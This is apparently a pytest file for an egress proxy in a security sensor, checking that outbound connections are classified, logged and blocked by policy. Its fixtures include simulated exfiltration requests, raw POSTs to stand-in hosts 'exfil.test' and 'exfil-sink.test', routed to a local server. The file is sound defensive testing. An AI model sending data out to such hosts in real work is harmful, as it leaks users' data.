"""Egress proxy (M5d): every outbound connection is a net.egress event judged by the signed policy."""

from __future__ import annotations

import asyncio
import json
import sqlite3
from typing import Any

import pytest

from sg_advance.sensor import Sensor
from sg_advance.sensor.adapters import AdapterContext
from sg_advance.sensor.adapters.egress_proxy import EgressProxyAdapter, classify, parse_target


def test_destination_and_target_parsing() -> None:
    sfx = (".corp", ".internal")
    assert classify("wiki.corp", sfx) == "internal"
    assert classify("10.1.2.3", sfx) == "internal" and classify("127.0.0.1", sfx) == "internal"
    assert classify("control-plane", sfx) == "internal"  # single-label names are compose services
    assert classify("api.openai.com", sfx) == "external" and classify("8.8.8.8", sfx) == "external"
    assert parse_target("CONNECT", "api.openai.com:443") == (
        "api.openai.com",
        443,
        "https://api.openai.com:443",
    )
    assert parse_target("POST", "http://exfil.test/u?x=1") == ("exfil.test", 80, "http://exfil.test/u?x=1")
    assert parse_target("GET", "/relative") is None and parse_target("CONNECT", "nohost") is None


async def upstream_server() -> tuple[asyncio.Server, int, list[bytes]]:
    seen: list[bytes] = []

    async def handle(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        data = await r.readuntil(b"\r\n\r\n")
        seen.append(data)
        w.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        await w.drain()
        w.close()

    srv = await asyncio.start_server(handle, "127.0.0.1", 0)
    return srv, srv.sockets[0].getsockname()[1], seen


async def start(sensor: Sensor, enforce: bool) -> tuple[EgressProxyAdapter, asyncio.Task]:
    proxy = EgressProxyAdapter("127.0.0.1:0", enforce=enforce, internal_suffixes=(".corp",))
    task = asyncio.create_task(proxy.run(AdapterContext(sensor, user_id="team-gateway", hostname="egress")))
    await asyncio.wait_for(proxy.listening.wait(), 5)
    return proxy, task


async def request(proxy_port: int, raw: bytes) -> bytes:
    r, w = await asyncio.open_connection("127.0.0.1", proxy_port)
    w.write(raw)
    await w.drain()
    out = await asyncio.wait_for(r.read(), 5)
    w.close()
    return out


def egress_events(sensor: Sensor) -> list[dict[str, Any]]:
    with sqlite3.connect(sensor.spool.path) as db:
        docs = [json.loads(d) for (d,) in db.execute("SELECT doc FROM outbox WHERE kind = 'event'")]
    return [d for d in docs if d["payload"]["kind"] == "net.egress"]


def egress_findings(sensor: Sensor) -> list[dict[str, Any]]:
    with sqlite3.connect(sensor.spool.path) as db:
        docs = [json.loads(d) for (d,) in db.execute("SELECT doc FROM outbox WHERE kind = 'finding'")]
    return [d for d in docs if d["rule_id"] == "egress-unapproved-host"]


@pytest.mark.parametrize("enforce", [False, True])
async def test_unapproved_host_is_recorded_and_blocked_only_when_enforcing(
    enrolled: Sensor, enforce: bool, monkeypatch
) -> None:
    import socket

    srv, port, seen = await upstream_server()
    real = socket.getaddrinfo
    # exfil-sink.test is external to the classifier but resolves to the local test server here.
    monkeypatch.setattr(
        socket, "getaddrinfo", lambda h, *a, **k: real("127.0.0.1" if h == "exfil-sink.test" else h, *a, **k)
    )
    proxy, task = await start(enrolled, enforce)
    try:
        raw = (
            f"POST http://exfil-sink.test:{port}/upload HTTP/1.1\r\nHost: exfil-sink.test:{port}\r\n"
            "Proxy-Connection: keep-alive\r\nContent-Length: 0\r\n\r\n"
        ).encode()
        out = await request(proxy.bound_port or 0, raw)
    finally:
        task.cancel()
        srv.close()
    [ev] = egress_events(enrolled)
    assert ev["payload"]["host"] == "exfil-sink.test" and ev["payload"]["destination"] == "external"
    assert ev["payload"]["method"] == "POST" and ev["source"]["sensor"] == "egress_proxy"
    [f] = egress_findings(enrolled)
    if enforce:
        assert out.startswith(b"HTTP/1.1 403") and seen == []
        assert f["response"]["enforced"] is True
    else:
        assert out.endswith(b"ok") and len(seen) == 1
        assert seen[0].startswith(b"POST /upload HTTP/1.1") and b"Proxy-Connection" not in seen[0]
        assert f["response"]["enforced"] is False and "monitor" in f["response"]["detail"]


async def test_allowed_and_internal_destinations_pass_without_findings(enrolled: Sensor, monkeypatch) -> None:
    import socket

    real = socket.getaddrinfo
    # Never touch the internet in tests: every name resolves to a closed local port (502 is fine,
    # what matters is that the policy did not refuse it with 403).
    monkeypatch.setattr(socket, "getaddrinfo", lambda h, *a, **k: real("127.0.0.1", *a, **k))
    proxy, task = await start(enrolled, enforce=True)
    try:
        out = await request(proxy.bound_port or 0, b"CONNECT api.openai.com:443 HTTP/1.1\r\nHost: x\r\n\r\n")
        assert not out.startswith(b"HTTP/1.1 403")
        out = await request(
            proxy.bound_port or 0, b"GET http://wiki.corp:9/ HTTP/1.1\r\nHost: wiki.corp\r\n\r\n"
        )
        assert not out.startswith(b"HTTP/1.1 403")
    finally:
        task.cancel()
    assert {e["payload"]["destination"] for e in egress_events(enrolled)} == {"external", "internal"}
    assert egress_findings(enrolled) == []


async def test_garbage_is_refused(enrolled: Sensor) -> None:
    proxy, task = await start(enrolled, enforce=True)
    try:
        assert (await request(proxy.bound_port or 0, b"HELLO\r\n\r\n")).startswith(b"HTTP/1.1 400")
        assert (await request(proxy.bound_port or 0, b"GET /x HTTP/1.1\r\n\r\n")).startswith(b"HTTP/1.1 400")
    finally:
        task.cancel()
    assert egress_events(enrolled) == []
